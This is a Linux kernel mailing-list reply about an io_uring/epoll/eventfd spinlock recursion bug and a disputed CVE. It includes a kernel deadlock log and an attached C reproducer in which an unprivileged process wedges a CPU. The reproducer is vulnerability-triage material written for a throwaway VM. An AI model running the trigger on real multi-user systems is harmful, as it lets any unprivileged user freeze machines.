Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=100.103.45.18
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1794919351;
	b=aTxyiJF/bn5FUL3t+36u5t2v5d/g9F7jIOD1d5WtDrrv2hFxKk1KMutX8gVkdafyX4kF
	 u/RhnxLuW5+OitCE2xbLWCW2+FcXX/lj1+92eBALpwdpF9kwOFUBlSRdwaazBB7sF3ZiI
	 6dlvnk/fWAV5Ii1IHDp8uacsxt2Uqnz1Ot92QIZa1mBipXAj+S9RBh2e+TfQHCk1ukNxU
	 qiM1ZhubA8prD22rPX0yz9sL5aGjEEjV/JQ0C2eDCj8tHYn2RlnycsNvSJq3PE3LtcgSh
	 vNZw429M7MB/BUvwou5adZkl/x8/cM+aWZFJHyLoNl0+dSFivHz2kIsSyjMir6P7G5Q==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1794919351;
	h=Received:DKIM-Signature:Date:From:To:Cc:Subject:Message-ID:
	 References:MIME-Version:Content-Type:Content-Disposition:In-Reply-To;
	bh=c+AfssxcVSHKerRx2VETY60D1d2QrJBwlmVuVkUdzLc=;
	b=GW75NG2RqJHHalLGa/xA0tcS43VIP4V8EDskALOurm4JoPyt9x8tE7SJjh2p6gvHo1vC
	 koKhMdnHMdvpmIoRoI3BFMnyiQLlZUbPb2v6IstdH/nyqdrDsSYFrmFC+oFVMdrKw0cbm
	 A858L4Gx2N3WYwb7svjoe/PxcPr7tbKWvdk2qTBnpYzl86zktJ/VCKC2G03S8vwDlzhF5
	 Qx9M85oIC3QQDQvA+jpAx3ePwZwuI9ziSmFXwxd97qJSbd6CWp38KzqcpIm8WRxPM0qR+
	 2OPDdUGY5w2jf/pOzQbwZs11A0KrGAoR9o7vk4FZYMlTdhMQVri51StRoXUwJXTzBnw==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dkim=pass header.d=kernel.org header.i=@kernel.org header.a=rsa-sha256 header.s=k20260515 header.b=L37pnRGi;
	arc=none smtp.remote-ip=100.103.45.18
Received: from smtp.kernel.org (quasi.space.kernel.org [100.103.45.18])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 68420606A31C;
	Tue, 17 Nov 2026 12:42:31 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.a=rsa-sha256 header.s=k20260515 header.b=L37pnRGi
Received: by smtp.kernel.org (Postfix) with ESMTPSA id BF6291F000C5;
	Tue, 17 Nov 2026 12:42:30 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=kernel.org;
	s=k20260515; t=1794919351;
	bh=c+AfssxcVSHKerRx2VETY60D1d2QrJBwlmVuVkUdzLc=;
	h=Date:From:To:Cc:Subject:References:In-Reply-To;
	b=L37pnRGiQb7iDr0XhRYCYfIQliF1yzXlGymD+grjKvcdqc+vwIQzYYzx5YvUAu8OW
	 xlLCZHcosTq7/pJtDIjSZtegNRoGh5uMPdOtRoydFPfSpmvl2HKk8PM0aCN6rfIoI2
	 hz2ojsvo8yw3LB058dDCovrTa/oXqHvVHjrD+mhPso/s2gI8hGu6N0CsOiecvV7w1W
	 HTMat2/exXwehX+7hnxL/XL0lBZBtmVQ0ZNIkY0ysXXttaNdLQJLrk4Lshy4lD1bP/
	 sJZ5woPwlo+Pk072X0LTWT7JTOpl+eXEwFAcicRkzQ5zm7jHxo+h8f1903mutvKHX3
	 cHhKIRiJbfVlw==
Date: Tue, 17 Nov 2026 07:42:29 -0500
From: Sasha Levin <sashal@kernel.org>
To: Jens Axboe <axboe@kernel.dk>
Cc: Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
	"stable@vger.kernel.org" <stable@vger.kernel.org>,
	"io-uring@vger.kernel.org" <io-uring@vger.kernel.org>,
	Yufan Chen <yufan.chen@linux.dev>, dev@rebasedinc.com
Subject: Re: io_uring/eventfd: registered eventfd signals only once after the
 cd305ee3633a backport (6.18.y, 6.12.y, Ubuntu 26.04)
Message-ID: <avxLtZ2YLHdbeZxC@laps>
References: <oMhla8VwCWoihfrmgn8znIy60W1QXI8g_v2OyB9i6sWESIDlVJlwoGGOLylJgIHRARNoieXUVRGqzeB__KvHMdXgnCfPPovs8vLMOzaMPEw=@rebasedinc.com>
 <draft-agent5-0001-re-eventfd-signal@kernel.org>
 <5d92861f-9a4d-4810-8700-b9e457ed9c86@kernel.dk>
 <2026111605-deskbound-clobber-a4a1@gregkh>
 <07947062-2974-4630-90db-1556e25b50bb@kernel.dk>
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Post: <mailto:stable@vger.kernel.org>
List-Help: <mailto:stable+help@vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
List-Owner: <mailto:stable+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="xixEITjz6/j0w9CW"
Content-Disposition: inline
In-Reply-To: <07947062-2974-4630-90db-1556e25b50bb@kernel.dk>

--xixEITjz6/j0w9CW
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Disposition: inline

On Mon, Nov 16, 2026 at 07:21:38PM -0700, Jens Axboe wrote:
>On 11/16/26 2:52 AM, Greg Kroah-Hartman wrote:
>> On Sat, Nov 14, 2026 at 11:12:40AM -0700, Jens Axboe wrote:
>>> On 11/14/26 10:42 AM, Sasha Levin wrote:
>>>> On 2026-11-13, dev@rebasedinc.com wrote:
>>>>> If this is correct, a backport of 04fe9aeb4f3c to 6.18.y and 6.12.y looks like the right fix; it keeps the CVE-2026-80920 fix in place.
>>>>
>>>> Queued for 6.18 and 6.12, thanks.
>>>
>>> Yet another bs CVE - Greg, please invalidate this one too, it's NOT CVE material.
>>> Getting a little tired of chasing these.
>>
>> Now rejected, sorry about that.
>
>Not sure how we improve on that, it's really annoying to catch these bogus
>ones after the fact?

Hi Jens,

Since some of our reviews are LLM based, I was looking to see why this one was
flagged as a security issue.

 From the explanation, and looking at the code, it seems that we can register an
eventfd with io_uring, then have epoll watch that same eventfd. When something
wakes the epoll, the kernel is holding epoll's wait-queue lock. That wakeup
runs io_uring's poll handler, which signals the eventfd, but the eventfd is
watched by the same epoll, so it tries to grab that same lock again on the same
CPU. The CPU spins forever on a lock it already holds. One core is dead,
followed by RCU stalls, machine wedges. Any unprivileged user with io_uring
access can do it.

I've attached the reproducer, and below is a log from a run with that
reproducer.

[    1.112892] ============================================
[    1.113398] WARNING: possible recursive locking detected
[    1.113911] 7.2.0-rc1-00006-g3f3a6a16bbe8 #3 Not tainted
[    1.114416] --------------------------------------------
[    1.114919] init/61 is trying to acquire lock:
[    1.115348] ffff888002e388f0 (&ep->poll_wait/1){....}-{3:3}, at: ep_poll_callback+0x556/0x930
[    1.116157] 
[    1.116157] but task is already holding lock:
[    1.116711] ffff888002e388f0 (&ep->poll_wait/1){....}-{3:3}, at: ep_poll_callback+0x556/0x930
[    1.117509] 
[    1.117509] other info that might help us debug this:
[    1.118125]  Possible unsafe locking scenario:
[    1.118125] 
[    1.118686]        CPU0
[    1.118933]        ----
[    1.119180]   lock(&ep->poll_wait/1);
[    1.119538]   lock(&ep->poll_wait/1);
[    1.119897] 
[    1.119897]  *** DEADLOCK ***
[    1.119897] 
[    1.120454]  May be due to missing lock nesting notation
[    1.120454] 
[    1.121090] 4 locks held by init/61:
[    1.121439]  #0: ffff888002e124a0 (&pipe->rd_wait){....}-{3:3}, at: __wake_up_sync_key+0x20/0x60
[    1.122270]  #1: ffff888002e388f0 (&ep->poll_wait/1){....}-{3:3}, at: ep_poll_callback+0x556/0x930
[    1.123107]  #2: ffffffff87222340 (rcu_read_lock){....}-{1:3}, at: io_eventfd_signal+0x8b/0x720
[    1.123923]  #3: ffff888002c2cc20 (&ctx->wqh){....}-{3:3}, at: eventfd_signal_mask+0x69/0x200
[    1.124723] 
[    1.124723] stack backtrace:
[    1.125145] CPU: 1 UID: 65534 PID: 61 Comm: init Not tainted 7.2.0-rc1-00006-g3f3a6a16bbe8 #3 PREEMPT(full) 
[    1.125148] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.17.0-debian-1.17.0-1 04/01/2014
[    1.125150] Call Trace:
[    1.125152]  <TASK>
[    1.125153]  dump_stack_lvl+0x5d/0x80
[    1.125157]  print_deadlock_bug.cold+0xc0/0xcd
[    1.125160]  __lock_acquire+0x10d3/0x17e0
[    1.125163]  ? add_lock_to_list+0x2c/0xd0
[    1.125165]  lock_acquire+0x17d/0x2e0
[    1.125167]  ? ep_poll_callback+0x556/0x930
[    1.125169]  ? find_held_lock+0x2b/0x80
[    1.125170]  _raw_spin_lock_irqsave_nested+0x36/0x60
[    1.125174]  ? ep_poll_callback+0x556/0x930
[    1.125175]  ? _raw_spin_unlock_irqrestore+0x22/0x50
[    1.125177]  ep_poll_callback+0x556/0x930
[    1.125178]  ? lock_is_held_type+0xa8/0x150
[    1.125181]  __wake_up_common+0x144/0x220
[    1.125183]  eventfd_signal_mask+0x10e/0x200
[    1.125184]  io_eventfd_signal+0x6ae/0x720
[    1.125186]  ? __pfx_io_eventfd_signal+0x10/0x10
[    1.125187]  ? find_held_lock+0x2b/0x80
[    1.125189]  io_req_local_work_add+0x1f9/0x410
[    1.125191]  ? __io_poll_execute+0x258/0x300
[    1.125192]  io_poll_wake+0x2c7/0x3a0
[    1.125193]  ? lock_is_held_type+0xa8/0x150
[    1.125195]  __wake_up_common+0x144/0x220
[    1.125196]  ep_poll_callback+0x5ae/0x930
[    1.125197]  ? lock_is_held_type+0xa8/0x150
[    1.125199]  __wake_up_common+0x144/0x220
[    1.125200]  __wake_up_sync_key+0x3e/0x60
[    1.125201]  anon_pipe_write+0xe5c/0x1c70
[    1.125205]  ? __pfx_anon_pipe_write+0x10/0x10
[    1.125207]  ? __file_has_perm+0x322/0x4c0
[    1.125209]  ? file_tty_write.isra.0+0x4ad/0x7d0
[    1.125213]  ? lock_release+0xe1/0x310
[    1.125215]  ? file_tty_write.isra.0+0x4ad/0x7d0
[    1.125216]  ? selinux_file_permission+0x22c/0x520
[    1.125218]  vfs_write+0xa5c/0xf90
[    1.125221]  ? __pfx_vfs_write+0x10/0x10
[    1.125222]  ? do_epoll_ctl+0xf5/0x1d0
[    1.125224]  ? __pfx___do_sys_io_uring_enter+0x10/0x10
[    1.125226]  ksys_write+0x1ab/0x250
[    1.125228]  ? __pfx_ksys_write+0x10/0x10
[    1.125229]  ? do_epoll_create+0x39c/0x4f0
[    1.125231]  ? do_syscall_64+0x82/0x6a0
[    1.125232]  ? lockdep_hardirqs_on_prepare+0xd9/0x190
[    1.125234]  do_syscall_64+0xf3/0x6a0
[    1.125235]  ? exc_page_fault+0xde/0xf0
[    1.125236]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    1.125238] RIP: 0033:0x4247d2
[    1.125240] Code: 18 41 8b 93 08 03 00 00 59 5e 48 83 f8 fc 75 1a 83 e2 39 83 fa 08 75 12 e8 1b ff ff ff 0f 1f 00 49 89 ca 48 8b 44 24 20 0f 05 <48> 83 c4 18 c3 66 0f 1f 84 00 00 00 00 00 48 83 ec 10 ff 74 24 18
[    1.125241] RSP: 002b:00007ffcb0c306a0 EFLAGS: 00000202 ORIG_RAX: 0000000000000001
[    1.125244] RAX: ffffffffffffffda RBX: 00007f2f89438008 RCX: 00000000004247d2
[    1.125245] RDX: 0000000000000001 RSI: 00007ffcb0c3072b RDI: 0000000000000007
[    1.125246] RBP: 00007f2f8943800c R08: 0000000000000000 R09: 0000000000000000
[    1.125247] R10: 0000000000000000 R11: 0000000000000202 R12: 00007f2f89438040
[    1.125248] R13: 00007f2f89438014 R14: 0000000000000008 R15: 0000000000000004
[    1.125249]  </TASK>
[    1.219726] clocksource: Watchdog remote CPU 1 read timed out
[   27.114321] rcu: INFO: rcu_preempt detected stalls on CPUs/tasks:
[   27.114996] rcu: 	1-...0: (6 ticks this GP) idle=22d4/1/0x4000000000000000 softirq=75/76 fqs=6349
[   27.115882] rcu: 	(detected by 0, t=26002 jiffies, g=-959, q=8 ncpus=2)
[   27.116532] Sending NMI from CPU 0 to CPUs 1:
[   27.116563] NMI backtrace for cpu 1
[   27.116573] CPU: 1 UID: 65534 PID: 61 Comm: init Not tainted 7.2.0-rc1-00006-g3f3a6a16bbe8 #3 PREEMPT(full) 
[   27.116581] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.17.0-debian-1.17.0-1 04/01/2014
[   27.116585] RIP: 0010:native_halt+0xe/0x30
[   27.116598] Code: 89 cf e9 f5 a9 3a 01 0f 1f 44 00 00 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 f3 0f 1e fa eb 07 0f 00 2d 73 26 7e 03 f4 <c3> cc cc cc cc 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 00 90 90 90 90
[   27.116602] RSP: 0018:ffff888002e676b0 EFLAGS: 00000046
[   27.116609] RAX: 0000000000000000 RBX: ffff888002e388d8 RCX: 0000000000000004
[   27.116612] RDX: 0000000000000000 RSI: 0000000000000003 RDI: ffff888002e388d8
[   27.116614] RBP: dffffc0000000000 R08: ffffffff861a809a R09: 1ffff110005c711b
[   27.116616] R10: ffffed10005c711c R11: ffffed10005c711c R12: 0000000000000000
[   27.116617] R13: 0000000000000000 R14: ffffed10005c711b R15: ffff88806cf39280
[   27.116626] FS:  0000000033fe5400(0000) GS:ffff8880e47b7000(0000) knlGS:0000000000000000
[   27.116641] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   27.116648] CR2: 000000000047c042 CR3: 000000000362d000 CR4: 0000000000750ef0
[   27.116652] PKRU: 55555554
[   27.116654] Call Trace:
[   27.116658]  <TASK>
[   27.116660]  kvm_wait+0xcf/0x110
[   27.116670]  __pv_queued_spin_lock_slowpath+0x6b4/0xe30
[   27.116679]  ? __pfx___pv_queued_spin_lock_slowpath+0x10/0x10
[   27.116683]  ? perf_trace_lock+0x1d0/0x500
[   27.116689]  ? add_lock_to_list+0x2c/0xd0
[   27.116694]  do_raw_spin_lock+0x1e9/0x280
[   27.116700]  ? ep_poll_callback+0x556/0x930
[   27.116706]  ? __pfx_do_raw_spin_lock+0x10/0x10
[   27.116712]  _raw_spin_lock_irqsave_nested+0x3e/0x60
[   27.116717]  ? ep_poll_callback+0x556/0x930
[   27.116721]  ? _raw_spin_unlock_irqrestore+0x22/0x50
[   27.116726]  ep_poll_callback+0x556/0x930
[   27.116731]  ? lock_is_held_type+0xa8/0x150
[   27.116736]  __wake_up_common+0x144/0x220
[   27.116740]  eventfd_signal_mask+0x10e/0x200
[   27.116746]  io_eventfd_signal+0x6ae/0x720
[   27.116753]  ? __pfx_io_eventfd_signal+0x10/0x10
[   27.116758]  ? find_held_lock+0x2b/0x80
[   27.116761]  io_req_local_work_add+0x1f9/0x410
[   27.116767]  ? __io_poll_execute+0x258/0x300
[   27.116772]  io_poll_wake+0x2c7/0x3a0
[   27.116776]  ? lock_is_held_type+0xa8/0x150
[   27.116779]  __wake_up_common+0x144/0x220
[   27.116783]  ep_poll_callback+0x5ae/0x930
[   27.116788]  ? lock_is_held_type+0xa8/0x150
[   27.116791]  __wake_up_common+0x144/0x220
[   27.116794]  __wake_up_sync_key+0x3e/0x60
[   27.116800]  anon_pipe_write+0xe5c/0x1c70
[   27.116808]  ? __pfx_anon_pipe_write+0x10/0x10
[   27.116813]  ? __file_has_perm+0x322/0x4c0
[   27.116817]  ? file_tty_write.isra.0+0x4ad/0x7d0
[   27.116823]  ? lock_release+0xe1/0x310
[   27.116828]  ? file_tty_write.isra.0+0x4ad/0x7d0
[   27.116832]  ? selinux_file_permission+0x22c/0x520
[   27.116837]  vfs_write+0xa5c/0xf90
[   27.116842]  ? __pfx_vfs_write+0x10/0x10
[   27.116847]  ? do_epoll_ctl+0xf5/0x1d0
[   27.116850]  ? __pfx___do_sys_io_uring_enter+0x10/0x10
[   27.116857]  ksys_write+0x1ab/0x250
[   27.116861]  ? __pfx_ksys_write+0x10/0x10
[   27.116865]  ? do_epoll_create+0x39c/0x4f0
[   27.116870]  ? do_syscall_64+0x82/0x6a0
[   27.116874]  ? lockdep_hardirqs_on_prepare+0xd9/0x190
[   27.116878]  do_syscall_64+0xf3/0x6a0
[   27.116883]  ? exc_page_fault+0xde/0xf0
[   27.116886]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[   27.116891] RIP: 0033:0x4247d2
[   27.116896] Code: 18 41 8b 93 08 03 00 00 59 5e 48 83 f8 fc 75 1a 83 e2 39 83 fa 08 75 12 e8 1b ff ff ff 0f 1f 00 49 89 ca 48 8b 44 24 20 0f 05 <48> 83 c4 18 c3 66 0f 1f 84 00 00 00 00 00 48 83 ec 10 ff 74 24 18
[   27.116899] RSP: 002b:00007ffcb0c306a0 EFLAGS: 00000202 ORIG_RAX: 0000000000000001
[   27.116905] RAX: ffffffffffffffda RBX: 00007f2f89438008 RCX: 00000000004247d2
[   27.116907] RDX: 0000000000000001 RSI: 00007ffcb0c3072b RDI: 0000000000000007
[   27.116909] RBP: 00007f2f8943800c R08: 0000000000000000 R09: 0000000000000000
[   27.116911] R10: 0000000000000000 R11: 0000000000000202 R12: 00007f2f89438040
[   27.116913] R13: 00007f2f89438014 R14: 0000000000000008 R15: 0000000000000004
[   27.116916]  </TASK>

-- 
Thanks,
Sasha

--xixEITjz6/j0w9CW
Content-Type: text/x-csrc; charset=us-ascii
Content-Disposition: attachment; filename=repro.c

/*
 * Local VM reproducer for the eventfd<->epoll recursion fixed by
 *   cd305ee3633a ("io_uring: defer eventfd signaling when queued from a
 *                   wakeup handler")
 *
 * Runs as PID 1 (init) inside a throwaway initramfs. Builds the graph:
 *
 *   io_uring(DEFER_TASKRUN) --poll--> epoll fd --watches--> eventfd
 *                       ^-- registered as this ring's CQ eventfd --'
 *
 * Triggering a non-eventfd source (a pipe) makes the io_uring poll wake
 * fire while ep->poll_wait.lock is held; on a buggy kernel the CQ-eventfd
 * signal goes out inline and re-enters epoll, re-acquiring the same lock on
 * the same CPU -> spinlock recursion -> the CPU wedges.
 *
 * Privilege model: PID 1 starts as root only to mount devtmpfs / open the
 * console and, at the end, to power the VM off (reboot() needs CAP_SYS_BOOT).
 * The io_uring/epoll/pipe graph and the trigger run in a CHILD that first
 * drops to uid/gid 65534 and proves the drop is irreversible. So the bug is
 * reached entirely from an unprivileged process; the root parent only reaps
 * the child and shuts the machine down.
 */
#define _GNU_SOURCE
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <grp.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/epoll.h>
#include <sys/eventfd.h>
#include <sys/mount.h>
#include <sys/reboot.h>
#include <linux/reboot.h>
#include <poll.h>

/* --- io_uring uapi (vendored, exact 64-byte sqe layout) --- */
#define IORING_SETUP_SINGLE_ISSUER (1U << 12)
#define IORING_SETUP_DEFER_TASKRUN (1U << 13)
#define IORING_OP_POLL_ADD         6
#define IORING_POLL_ADD_MULTI      (1U << 0)
#define IORING_REGISTER_EVENTFD    4
#define IORING_OFF_SQ_RING         0ULL
#define IORING_OFF_CQ_RING         0x8000000ULL
#define IORING_OFF_SQES            0x10000000ULL
#define IORING_FEAT_SINGLE_MMAP    (1U << 0)

struct io_uring_sqe {
	uint8_t  opcode;
	uint8_t  flags;
	uint16_t ioprio;
	int32_t  fd;
	uint64_t off;
	uint64_t addr;
	uint32_t len;
	uint32_t poll32_events;
	uint64_t user_data;
	uint16_t buf_index;
	uint16_t personality;
	int32_t  splice_fd_in;
	uint64_t addr3;
	uint64_t __pad2;
};

struct io_sqring_offsets {
	uint32_t head, tail, ring_mask, ring_entries, flags, dropped, array, resv1;
	uint64_t user_addr;
};
struct io_cqring_offsets {
	uint32_t head, tail, ring_mask, ring_entries, overflow, cqes, flags, resv1;
	uint64_t user_addr;
};
struct io_uring_params {
	uint32_t sq_entries, cq_entries, flags, sq_thread_cpu, sq_thread_idle, features, wq_fd, resv[3];
	struct io_sqring_offsets sq_off;
	struct io_cqring_offsets cq_off;
};

static int io_uring_setup(unsigned e, struct io_uring_params *p)
{ return (int)syscall(__NR_io_uring_setup, e, p); }
static int io_uring_enter(int fd, unsigned to_submit, unsigned min_complete, unsigned flags)
{ return (int)syscall(__NR_io_uring_enter, fd, to_submit, min_complete, flags, (void *)0, (size_t)0); }
static int io_uring_register(int fd, unsigned op, void *arg, unsigned nr)
{ return (int)syscall(__NR_io_uring_register, fd, op, arg, nr); }

static void say(const char *s) { write(1, s, strlen(s)); }
static void sayn(const char *s, long n)
{
	char b[32]; int i = 0; unsigned long v;
	say(s);
	if (n < 0) { write(1, "-", 1); v = (unsigned long)(-n); } else v = (unsigned long)n;
	char t[24]; int j = 0;
	if (v == 0) t[j++] = '0';
	while (v) { t[j++] = '0' + (v % 10); v /= 10; }
	while (j) b[i++] = t[--j];
	b[i++] = '\n';
	write(1, b, i);
}

/* The whole trigger, run by the UNPRIVILEGED child. Returns on survival. */
static void run_repro(void)
{
	struct io_uring_params p;
	memset(&p, 0, sizeof(p));
	p.flags = IORING_SETUP_SINGLE_ISSUER | IORING_SETUP_DEFER_TASKRUN;
	int ring = io_uring_setup(8, &p);
	if (ring < 0) { sayn("ERR io_uring_setup errno=", errno); return; }
	sayn("ring fd=", ring);
	sayn("params.flags=", p.flags);
	sayn("features=", p.features);

	size_t sqsz = p.sq_off.array + p.sq_entries * sizeof(uint32_t);
	size_t cqsz = p.cq_off.cqes + p.cq_entries * sizeof(uint64_t) * 2;
	size_t rsz = sqsz > cqsz ? sqsz : cqsz;
	void *sq = mmap(0, rsz, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, ring, IORING_OFF_SQ_RING);
	if (sq == MAP_FAILED) { sayn("ERR mmap sq errno=", errno); return; }
	void *cq = (p.features & IORING_FEAT_SINGLE_MMAP) ? sq :
		mmap(0, cqsz, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, ring, IORING_OFF_CQ_RING);
	if (cq == MAP_FAILED) { sayn("ERR mmap cq errno=", errno); return; }
	struct io_uring_sqe *sqes = mmap(0, p.sq_entries * sizeof(*sqes),
		PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, ring, IORING_OFF_SQES);
	if (sqes == MAP_FAILED) { sayn("ERR mmap sqes errno=", errno); return; }

	uint32_t *sq_tail  = (uint32_t *)((char *)sq + p.sq_off.tail);
	uint32_t *sq_mask  = (uint32_t *)((char *)sq + p.sq_off.ring_mask);
	uint32_t *sq_array = (uint32_t *)((char *)sq + p.sq_off.array);
	uint32_t *cq_head  = (uint32_t *)((char *)cq + p.cq_off.head);
	uint32_t *cq_tail  = (uint32_t *)((char *)cq + p.cq_off.tail);
	uint32_t *cq_mask  = (uint32_t *)((char *)cq + p.cq_off.ring_mask);
	struct cqe { uint64_t user_data; int32_t res; uint32_t flags; };
	struct cqe *cqes = (struct cqe *)((char *)cq + p.cq_off.cqes);

	/* eventfd, registered as this ring's CQ eventfd */
	int efd = eventfd(0, 0);
	if (efd < 0) { sayn("ERR eventfd errno=", errno); return; }
	if (io_uring_register(ring, IORING_REGISTER_EVENTFD, &efd, 1) < 0) {
		sayn("ERR register eventfd errno=", errno); return;
	}

	/* A non-eventfd trigger source: a pipe. Writing it kicks epoll without
	 * setting current->in_eventfd, so the buggy inline signal is not masked. */
	int pfd[2];
	if (pipe(pfd) < 0) { sayn("ERR pipe errno=", errno); return; }

	/* epoll instance that watches BOTH the pipe (trigger) and the eventfd
	 * (the CQ-notification target that feeds back in). */
	int ep = epoll_create1(0);
	if (ep < 0) { sayn("ERR epoll_create1 errno=", errno); return; }
	struct epoll_event ev; memset(&ev, 0, sizeof(ev));
	ev.events = EPOLLIN; ev.data.fd = efd;
	if (epoll_ctl(ep, EPOLL_CTL_ADD, efd, &ev) < 0) { sayn("ERR epoll_ctl efd errno=", errno); return; }
	ev.events = EPOLLIN; ev.data.fd = pfd[0];
	if (epoll_ctl(ep, EPOLL_CTL_ADD, pfd[0], &ev) < 0) { sayn("ERR epoll_ctl pipe errno=", errno); return; }

	/* arm an io_uring poll on the epoll fd itself */
	uint32_t idx = 0;
	struct io_uring_sqe *s = &sqes[idx];
	memset(s, 0, sizeof(*s));
	s->opcode = IORING_OP_POLL_ADD;
	s->fd = ep;
	s->poll32_events = POLLIN;
	s->len = IORING_POLL_ADD_MULTI;   /* multishot: waiter stays armed on ep->poll_wait */
	s->user_data = 0x1234;
	uint32_t tail = *sq_tail;
	sq_array[tail & *sq_mask] = idx;
	__atomic_store_n(sq_tail, tail + 1, __ATOMIC_RELEASE);

	int r = io_uring_enter(ring, 1, 0, 0);
	if (r < 0) { sayn("ERR io_uring_enter errno=", errno); return; }
	sayn("io_uring_enter submit ret=", r);
	sayn("after arm: cq_tail=", (long)*cq_tail);
	if (*cq_tail != *cq_head) {
		struct cqe *e = &cqes[*cq_head & *cq_mask];
		sayn("  INLINE completion at arm, res=", (long)e->res);
	}
	say("ARMED poll on epoll fd; triggering via pipe...\n");

	/* Kick the pipe (not the eventfd). On a buggy kernel this write never
	 * returns: epoll wakes the io_uring poll while holding ep->poll_wait.lock,
	 * the poll's first task_work add signals the CQ eventfd inline, that
	 * re-enters epoll and recurses on ep->poll_wait.lock on this same CPU. */
	char one = 'x';
	ssize_t w = write(pfd[1], &one, 1);
	sayn("pipe write returned ", (long)w);
	sayn("after write: cq_tail=", (long)*cq_tail);

	/* Did the inline task_work-add signal the CQ eventfd? Peek its counter. */
	{
		int fl = fcntl(efd, F_GETFL); fcntl(efd, F_SETFL, fl | O_NONBLOCK);
		uint64_t cnt = 0; ssize_t rr = read(efd, &cnt, sizeof(cnt));
		if (rr == sizeof(cnt)) sayn("efd counter after write = ", (long)cnt);
		else sayn("efd not signaled (read rr=", (long)rr);
		fcntl(efd, F_SETFL, fl);
	}

	/* Run deferred task_work and reap to see the poll result/res. */
	io_uring_enter(ring, 0, 0, 1 /*GETEVENTS*/);
	sayn("after getevents: cq_tail=", (long)*cq_tail);
	if (*cq_tail != *cq_head) {
		struct cqe *e = &cqes[*cq_head & *cq_mask];
		sayn("  poll CQE res=", (long)e->res);
	}

	say("REPRO-SURVIVED\n");
}

/* Drop every privilege to uid/gid 65534 and refuse to continue if the drop
 * did not fully take. Order matters: setgroups + setgid must precede setuid. */
static void drop_privs(void)
{
	sayn("child uid before drop=", (long)getuid());
	sayn("child gid before drop=", (long)getgid());

	gid_t ng = 65534;   /* nogroup */
	uid_t nb = 65534;   /* nobody  */
	if (setgroups(0, (const gid_t *)0) < 0) sayn("WARN setgroups errno=", errno);
	if (setgid(ng) < 0) { sayn("ERR setgid errno=", errno); _exit(2); }
	if (setuid(nb) < 0) { sayn("ERR setuid errno=", errno); _exit(2); }

	sayn("child uid after drop=", (long)getuid());
	sayn("child gid after drop=", (long)getgid());
	if (getuid() != nb || getgid() != ng) { say("ERR drop incomplete\n"); _exit(2); }
	if (geteuid() == 0 || getegid() == 0) { say("ERR euid/egid still 0\n"); _exit(2); }

	/* The drop must be irreversible: regaining root has to fail. */
	if (setuid(0) == 0) { say("ERR regained root via setuid(0)\n"); _exit(2); }
	sayn("setuid(0) correctly refused, errno=", errno);
	/* A sanity cross-check: a non-root task cannot reboot(). */
	if (reboot(LINUX_REBOOT_CMD_CAD_OFF) == 0) { say("ERR non-root reboot() succeeded\n"); _exit(2); }
	sayn("reboot() from child correctly refused, errno=", errno);

	say("PRIV-DROPPED: running trigger as uid 65534\n");
}

int main(void)
{
	/* As init (root): working /dev and console on fd 1/2. */
	mount("devtmpfs", "/dev", "devtmpfs", 0, 0);
	int c = open("/dev/console", O_WRONLY);
	if (c >= 0) { dup2(c, 1); dup2(c, 2); }

	say("REPRO-START\n");
	sayn("init uid=", (long)getuid());

	pid_t pid = fork();
	if (pid == 0) {
		/* Unprivileged child: no capabilities, then hit the bug. */
		drop_privs();
		run_repro();
		_exit(0);
	}
	if (pid < 0) { sayn("ERR fork errno=", errno); }

	/* Root parent: reap the child (on a buggy kernel it wedges a CPU inside
	 * write() and never exits -> the box stalls and qemu times out), then
	 * power off cleanly on a fixed kernel. */
	int status = 0;
	if (pid > 0) {
		waitpid(pid, &status, 0);
		sayn("child exited, status=", (long)status);
	}

	sync();
	say("REPRO-POWEROFF\n");
	reboot(LINUX_REBOOT_CMD_POWER_OFF);
	for (;;) pause();
	return 0;
}

--xixEITjz6/j0w9CW--
